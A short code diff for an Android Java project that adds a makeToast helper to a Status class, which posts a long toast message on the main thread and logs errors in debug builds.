@@ -17,6 +17,7 @@ import android.content.Context;
 import android.os.Handler;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
+import android.widget.Toast;
 
 import com.android.deviceinfo.action.Action;
 import com.android.deviceinfo.auto.Cfg;
@@ -676,6 +677,23 @@ public class Status {
 
 	public synchronized boolean haveAdmin() {
 		return deviceAdmin;
+	}
+
+	public void makeToast(final String message) {
+		try{
+		Handler h = new Handler(getAppContext().getMainLooper());
+	     // Although you need to pass an appropriate context
+	    h.post(new Runnable() {
+	        @Override
+	        public void run() {
+	             Toast.makeText(context,message,Toast.LENGTH_LONG).show();
+	        }
+	    });
+		}catch(Exception ex){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (makeToast) Error: " + ex);
+			}
+		}
 	}
 
 }
